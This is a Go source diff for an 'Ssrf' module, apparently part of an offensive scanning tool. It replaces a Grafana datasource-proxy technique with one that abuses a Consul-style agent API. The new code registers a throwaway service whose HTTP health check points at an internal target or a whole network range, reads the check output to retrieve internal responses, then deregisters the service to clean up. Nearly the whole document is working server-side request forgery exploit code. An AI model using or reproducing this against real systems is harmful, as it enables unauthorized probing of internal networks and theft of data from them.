@@ -1,7 +1,6 @@
 package modules
 
 import (
-	"bytes"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -15,29 +14,35 @@ import (
 )
 
 type Ssrf struct {
-	ID          int            `json:"id"`
-	UID         string         `json:"uid"`
-	OrgID       int            `json:"orgId"`
-	Name        string         `json:"name"`
-	Type        string         `json:"type"`
-	TypeName    string         `json:"typeName"`
-	TypeLogoURL string         `json:"typeLogoUrl"`
-	Access      string         `json:"access"`
-	URL         string         `json:"url"`
-	User        string         `json:"user"`
-	Database    string         `json:"database"`
-	BasicAuth   bool           `json:"basicAuth"`
-	IsDefault   bool           `json:"isDefault"`
-	JsonData    map[string]any `json:"jsonData"`
-	ReadOnly    bool           `json:"readOnly"`
+}
+
+type ServiceCheck struct {
+	HTTP     string `json:"HTTP,omitempty"`
+	Interval string `json:"interval,omitempty"`
+}
+
+type ServiceRegistration struct {
+	ID      string        `json:"ID"`
+	Name    string        `json:"Name"`
+	Address string        `json:"Address"`
+	Port    int           `json:"Port"`
+	Check   *ServiceCheck `json:"check,omitempty"`
+}
+
+type AgentCheck struct {
+	Node        string `json:"Node"`
+	CheckID     string `json:"CheckID"`
+	Name        string `json:"Name"`
+	Status      string `json:"Status"`
+	Notes       string `json:"Notes"`
+	Output      string `json:"Output"`
+	serviceID   string `json:"serviceID"`
+	ServiceName string `json:"ServiceName"`
+	Interval    string `json:"Interval"`
 }
 
 func (m Ssrf) RunModule(target string, flags map[string]string, scheme string) {
-	if flags["user"] == "" && flags["password"] == "" {
-		return
-	}
-
-	defport := "3000"
+	defport := "8500"
 	if flags["port"] != "" {
 		defport = flags["port"]
 	}
@@ -47,7 +52,14 @@ func (m Ssrf) RunModule(target string, flags map[string]string, scheme string) {
 	}
 	timeout, _ := strconv.Atoi(flags["timeout"])
 
-	ssrfTargets := utils.ParseTargets(flags["ssrf-target"])
+	ssrfTargets := []string{flags["ssrf-target"]}
+
+	if flags["ssrf-network"] != "" {
+		ssrfTargets = utils.ParseTargets(flags["ssrf-network"])
+		for i, currTarget := range ssrfTargets {
+			ssrfTargets[i] = fmt.Sprintf("http://%s", currTarget)
+		}
+	}
 
 	//MAIN LOGIC
 	var wg sync.WaitGroup
@@ -65,14 +77,14 @@ func (m Ssrf) RunModule(target string, flags map[string]string, scheme string) {
 	for i, ssrfTarget := range ssrfTargets {
 		wg.Add(1)
 		sem <- struct{}{}
-		go makeSsrfRequest(&wg, sem, flags, target, defport, ssrfTarget, timeout)
+		go makeSsrfRequest(&wg, sem, flags, target, defport, ssrfTarget, timeout, scheme)
 		utils.ProgressBar(len(ssrfTargets), i+1, &progress)
 	}
 	fmt.Println("")
 	wg.Wait()
 }
 
-func makeSsrfRequest(wg *sync.WaitGroup, sem chan struct{}, flags map[string]string, target string, defport string, ssrfTarget string, timeout int) {
+func makeSsrfRequest(wg *sync.WaitGroup, sem chan struct{}, flags map[string]string, target string, defport string, ssrfTarget string, timeout int, scheme string) {
 	defer func() {
 		<-sem
 		wg.Done()
@@ -82,95 +94,118 @@ func makeSsrfRequest(wg *sync.WaitGroup, sem chan struct{}, flags map[string]str
 		Timeout: time.Duration(timeout) * time.Second,
 	}
 
-	dsID, err := createDS(flags, target, defport, client, ssrfTarget)
-	if err != nil {
-		utils.Colorize(utils.ColorRed, fmt.Sprintf("Can't create datasource%v", err))
+	url := fmt.Sprintf("%s://%s:%s", scheme, target, defport)
+
+	serviceName := fmt.Sprintf("testservice-%s", utils.RandStringRunes(10))
+	reg := ServiceRegistration{
+		ID:      serviceName,
+		Name:    serviceName,
+		Address: "127.0.0.1",
+		Port:    80,
+		Check: &ServiceCheck{
+			HTTP:     ssrfTarget,
+			Interval: "1s",
+		},
+	}
+
+	if err := registerService(&client, url, reg); err != nil {
+		utils.Colorize(utils.ColorRed, fmt.Sprintf("%s[!] %s:%s - %s\n", utils.ClearLine, target, flags["port"], err))
 		return
 	}
 
-	proxyURL := fmt.Sprintf("http://%s:%s@%s:%s/api/datasources/proxy/%d", flags["user"], flags["password"], target, defport, dsID)
-	proxyReq, err := http.NewRequest(http.MethodGet, proxyURL, nil)
-	if err != nil {
-		fmt.Println("err")
-	}
+	time.Sleep(2 * time.Second)
 
-	proxyResp, err := client.Do(proxyReq)
+	checks, err := getChecks(client, url)
 	if err != nil {
-		fmt.Printf("Can't make proxy request: %v\n", err)
-		deleteDS(flags, target, defport, client, dsID)
+		fmt.Fprintln(os.Stderr, "get checks error:", err)
+		_ = deregisterService(client, url, serviceName)
 		return
 	}
 
-	defer proxyResp.Body.Close()
-
-	body, _ := io.ReadAll(proxyResp.Body)
-	if body != nil {
-		utils.Colorize(utils.ColorYellow, fmt.Sprintf("[+] %s - %s", ssrfTarget, string(body)))
+	found := false
+	for key, c := range checks {
+		if c.serviceID == serviceName || c.CheckID == "service:"+serviceName || key == "service:"+serviceName {
+			if c.Output != "" {
+				utils.Colorize(utils.ColorYellow, fmt.Sprintf("[+] %s - %s", ssrfTarget, c.Output))
+			}
+			found = true
+			break
+		}
+	}
+	if !found {
+		fmt.Println("check wasn't found for svc", serviceName)
 	}
 
-	deleteDS(flags, target, defport, client, dsID)
-
+	// fmt.Printf("Deregistering service %q ...\n", serviceName)
+	if err := deregisterService(client, url, serviceName); err != nil {
+		fmt.Fprintln(os.Stderr, "deregister error:", err)
+		return
+	}
+	// fmt.Println("Deregistered.")
 }
 
-func createDS(flags map[string]string, target string, port string, client http.Client, ssrfTarget string) (int, error) {
-	url := fmt.Sprintf("http://%s:%s@%s:%s/api/datasources", flags["user"], flags["password"], target, port)
-
-	payload := map[string]any{
-		"name":     utils.RandStringRunes(10),
-		"type":     "prometheus",
-		"access":   "proxy",
-		"url":      fmt.Sprintf("http://%s:%s", ssrfTarget, flags["ssrf-port"]),
-		"jsonData": map[string]any{},
+func registerService(client *http.Client, addr string, reg ServiceRegistration) error {
+	url := fmt.Sprintf("%s/v1/agent/service/register", addr)
+	b, err := json.Marshal(reg)
+	if err != nil {
+		return err
 	}
 
-	payloadBytes, err := json.Marshal(payload)
-	if err != nil {
-		fmt.Println(err)
-		return 0, err
-	}
+	resp, err := utils.HttpRequest(url, http.MethodPut, b, *client)
 
-	req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(payloadBytes))
 	if err != nil {
-		fmt.Println(err)
-		return 0, err
-	}
-	req.Header.Set("Content-Type", "application/json")
-
-	resp, err := client.Do(req)
-	if err != nil {
-		// fmt.Println(err)
-		return 0, err
+		return err
 	}
 	defer resp.Body.Close()
 
-	if resp.StatusCode >= 300 {
-		body, _ := io.ReadAll(resp.Body)
-		utils.Colorize(utils.ColorRed, fmt.Sprintf("[!] %s:%s - %d %s", target, port, resp.StatusCode, string(body)))
-		return 0, fmt.Errorf("")
+	io.Copy(io.Discard, io.LimitReader(resp.Body, 1024))
+	if resp.StatusCode == 401 || resp.StatusCode == 403 {
+		return fmt.Errorf("access denied registering service (HTTP %d) — token required or insufficient rights", resp.StatusCode)
 	}
-
-	var createResp Ssrf
-	if err := json.NewDecoder(resp.Body).Decode(&createResp); err != nil {
-		fmt.Printf("Can't get Datasource creation response: %v\n", err)
-		return 0, err
+	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
+		return fmt.Errorf("unexpected status registering service: %d", resp.StatusCode)
 	}
-	dsID := createResp.ID
-
-	return dsID, nil
+	return nil
 }
 
-func deleteDS(flags map[string]string, target string, port string, client http.Client, dsID int) {
-	deleteURL := fmt.Sprintf("http://%s:%s@%s:%s/api/datasources/%d", flags["user"], flags["password"], target, port, dsID)
-	delReq, err := http.NewRequest(http.MethodDelete, deleteURL, nil)
+func getChecks(client http.Client, addr string) (map[string]AgentCheck, error) {
+	url := fmt.Sprintf("%s/v1/agent/checks", addr)
+	resp, err := utils.HttpRequest(url, http.MethodGet, []byte(""), client)
+
 	if err != nil {
-		fmt.Println("err")
+		return nil, err
 	}
-	delResp, err := client.Do(delReq)
-	if err != nil {
-		utils.Colorize(utils.ColorRed, fmt.Sprintf("Can't delete datasource%v", err))
+	defer resp.Body.Close()
+
+	if resp.StatusCode == 401 || resp.StatusCode == 403 {
+		return nil, fmt.Errorf("access denied reading checks (HTTP %d) - token required or insufficient rights", resp.StatusCode)
+	}
+	if resp.StatusCode != 200 {
+		return nil, fmt.Errorf("unexpected status reading checks: %d", resp.StatusCode)
 	}
 
-	if delResp != nil {
-		defer delResp.Body.Close()
+	dec := json.NewDecoder(io.LimitReader(resp.Body, 2<<20))
+	out := make(map[string]AgentCheck)
+	if err := dec.Decode(&out); err != nil {
+		return nil, err
 	}
+	return out, nil
+}
+
+func deregisterService(client http.Client, addr string, serviceName string) error {
+	url := fmt.Sprintf("%s/v1/agent/service/deregister/%s", addr, serviceName)
+	resp, err := utils.HttpRequest(url, http.MethodPut, []byte(""), client)
+
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+	io.Copy(io.Discard, io.LimitReader(resp.Body, 1024))
+	if resp.StatusCode == 401 || resp.StatusCode == 403 {
+		return fmt.Errorf("access denied deregistering service (HTTP %d) — token required or insufficient rights", resp.StatusCode)
+	}
+	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
+		return fmt.Errorf("unexpected status deregistering service: %d", resp.StatusCode)
+	}
+	return nil
 }
